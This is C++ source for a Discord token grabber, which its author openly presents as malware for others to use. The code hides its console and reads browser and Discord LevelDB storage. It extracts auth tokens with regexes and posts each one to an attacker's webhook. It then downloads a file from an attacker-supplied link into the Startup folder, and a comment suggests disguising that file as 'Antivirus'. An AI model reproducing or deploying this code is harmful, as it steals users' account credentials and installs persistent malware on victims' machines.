//open source token grabber | Hymerine#0001 | C++
#include <iostream>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <curl/curl.h>
#include <iostream>
#include <future>

#pragma comment(lib, "Winmm.lib")
#include <Windows.h>
#include <winternl.h>
#include <assert.h>
#include <tchar.h>
#include <ShlObj_core.h>
#include <AccCtrl.h>
#include <AclAPI.h>
#include <shellapi.h>
#include <Windows.h>
#include <string>
#include <ostream>
#include <filesystem>
#include <chrono>

#include <process.h>
#include <string>
#include <d3d9.h>
#include <dinput.h>
#include <tchar.h>
#define CURL_GLOBAL_ALL (CURL_GLOBAL_SSL|CURL_GLOBAL_WIN32)
#include <stdio.h> 
#include <urlmon.h> 
#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <io.h>
#include <cstdlib>
#include <wininet.h>
#include <locale>
#include <sstream>
#include <Windows.h>
#include <direct.h>
#include <lmcons.h>
#include <random>
#include <thread>
#include <functional>

#include <fstream>

#include <string>

#include <iostream>
#define CURL_STATICLIB
#include <fstream>
#include <sys/stat.h>
#include <filesystem>
#include <regex>
#include <winuser.rh>

#pragma comment(lib, "version")

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")

using namespace std;
namespace fs = std::filesystem;

const char* WEBHOOK = "You're Webhook here"; 

#define ULEN 256

std::string getusername()
{

    char user[100];
    DWORD userlen = ULEN + 1;

    GetUserNameA(user, &userlen);
    //std::cout << user << std::endl;
    return (std::string)user;//return user;
}

bool hasEnding(string const& fullString, string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

bool pathExist(const string& s)
{
    struct stat buffer;
    return (stat(s.c_str(), &buffer) == 0);
}

void sendWebhook(const char* content) {
    CURL* curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content);

        res = curl_easy_perform(curl);

        if (res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));

        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

vector<string> grabPath() 
{
    vector<string> targetLocations;

    char* roaming;
    size_t len;
    _dupenv_s(&roaming, &len, "APPDATA");

    char* local;
    size_t len2;
    _dupenv_s(&local, &len2, "LOCALAPPDATA");

    string Discord = string(roaming) + "\\Discord";
    string DiscordCanary = string(roaming) + "\\discordcanary";
    string DiscordPTB = string(roaming) + "\\discordptb";
    string Opera = string(roaming) + "\\Opera Software\\Opera Stable";
    string Chrome = string(local) + "\\Google\\Chrome\\User Data\\Default";
    string Brave = string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
    string Yandex = string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";

    targetLocations.push_back(Discord);
    targetLocations.push_back(DiscordCanary);
    targetLocations.push_back(DiscordPTB);
    targetLocations.push_back(Opera);
    targetLocations.push_back(Chrome);
    targetLocations.push_back(Brave);
    targetLocations.push_back(Yandex);

    free(local);
    free(roaming);

    return targetLocations;
}

vector<string> findMatch(string str, regex reg)
{
    vector<string> output;
    sregex_iterator currentMatch(str.begin(), str.end(), reg);
    sregex_iterator lastMatch;

    while (currentMatch != lastMatch) {
        smatch match = *currentMatch;
        output.push_back(match.str());
        currentMatch++;
    }

    return output;
}

void searchToken(const string& loc) {
    ifstream ifs(loc, ios_base::binary);
    string content((istreambuf_iterator<char>(ifs)), (istreambuf_iterator<char>()));

    vector<string> master;

    regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
    regex reg2("mfa\\.[\\w-]{84}");

    vector<string> check = findMatch(content, reg1);
    vector<string> check2 = findMatch(content, reg2);

    for (int i = 0; i < check.size(); i++) {
        master.push_back(check[i]);
    }
    for (int i = 0; i < check2.size(); i++) {
        master.push_back(check2[i]);
    }

    for (int i = 0; i < master.size(); i++) {
        string combine = "content=";
        combine += "```" + master[i] + "```";
        const char* postContent = combine.c_str();
        sendWebhook(postContent);
    }
}

void getToken(const string& path)
{
    string target = path + "\\Local Storage\\leveldb";

    for (const auto& entry : fs::directory_iterator(target))
    {
        string strPath = entry.path().u8string();
        if (hasEnding(strPath, ".log"))
        {
            searchToken(strPath);
        }

        if (hasEnding(strPath, ".ldb"))
        {
            searchToken(strPath);
        }
    }
}

DWORD FindProcessId(const std::wstring& processName)
{
    return 0;
}

int main() {
    FreeConsole();
    vector<string> targetLocation = grabPath();
    for (int i = 0; i < targetLocation.size(); i++) {
        if (pathExist(targetLocation[i])) {
            getToken(targetLocation[i]);
        }
    }
    if (pathExist("C:\\Users\\" + getusername() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")) { //if you want to set it in the start folder from the person :)
        string exe = "you're link"; //here put in your download link, upload it on discord and paste the link here
        string path = "C:\\Users\\" + getusername() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\RenameItToEverythingYouWant.exe"; //you can name it to everything you want like "Antivirus" lol
        URLDownloadToFileA(NULL, exe.c_str(), path.c_str(), 0, NULL);
        Sleep(2000);
        exit;

    }
}
